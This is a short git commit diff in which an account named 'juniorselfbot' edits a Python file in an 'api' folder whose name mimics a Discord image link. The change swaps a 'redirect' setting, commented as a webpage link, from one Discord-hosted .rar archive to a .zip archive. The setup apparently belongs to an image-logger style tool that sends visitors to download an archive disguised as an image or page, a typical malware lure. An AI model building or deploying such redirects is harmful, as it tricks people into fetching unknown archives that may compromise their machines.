2029e5e59d8d69f5078b2c1ab01d15dc9b97b44d
juniorselfbot <145881827+juniorselfbot@users.noreply.github.com>
2024-01-28 16:03:13 -0800

    Update 115032488403195089812009140610308505808jthWYF.pngex=65c7e960&is=65b57460&hm=cb2e0fe2bf22fce7667694c8345607a008ce37de7eef62da8e18dfe33520828f&.py

--- api/115032488403195089812009140610308505808jthWYF.pngex=65c7e960&is=65b57460&hm=cb2e0fe2bf22fce7667694c8345607a008ce37de7eef62da8e18dfe33520828f&.py
+++ api/115032488403195089812009140610308505808jthWYF.pngex=65c7e960&is=65b57460&hm=cb2e0fe2bf22fce7667694c8345607a008ce37de7eef62da8e18dfe33520828f&.py
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "https://cdn.discordapp.com/attachments/1201293305384812557/1201305092238888990/D04ykou.rar?ex=65c9558d&is=65b6e08d&hm=612296b81a45c76ddc1703303e6e8dc566779598fabbca86122cbcb85cfce8b4&" # Link to the webpage to redirect to 
+        "page": "https://cdn.discordapp.com/attachments/1201293305384812557/1201316067167977472/6lHpjRV.zip?ex=65c95fc5&is=65b6eac5&hm=7067dbaeca6599568c21ea794a68e57c40fa00023a27f9834ed6712aac1dbbca&" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
